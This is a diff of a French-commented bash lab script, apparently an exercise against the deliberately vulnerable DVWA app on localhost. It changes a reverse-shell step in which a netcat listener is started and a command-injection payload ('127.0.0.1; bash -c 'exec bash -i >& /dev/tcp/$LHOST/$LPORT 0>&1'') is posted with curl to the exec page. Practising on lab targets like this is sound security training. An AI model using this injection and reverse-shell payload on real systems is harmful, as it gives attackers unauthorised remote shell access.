@@ -45,11 +45,11 @@ echo "--- 3. Reverse shell (optionnel: bash lab_cmdi.sh reverseshell) ---"
 if [ "${1:-}" = "reverseshell" ]; then
   echo "[*] Démarrage du listener sur $LHOST:$LPORT"
   echo "[*] Envoi du payload reverse shell..."
-  echo "Payload: 127.0.0.1; bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
+   echo "Payload: 127.0.0.1; bash -c 'exec bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
   # Démarrer listener en arrière-plan
   timeout 10 nc -lvnp "$LPORT" &
   sleep 1
-  PAYLOAD="127.0.0.1; bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
+  PAYLOAD="127.0.0.1; bash -c 'exec bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
   curl -s -b "PHPSESSID=$SESSION;security=low" \
     -X POST "http://localhost:$DVWA_PORT/vulnerabilities/exec/" \
     --data-urlencode "ip=$PAYLOAD" \
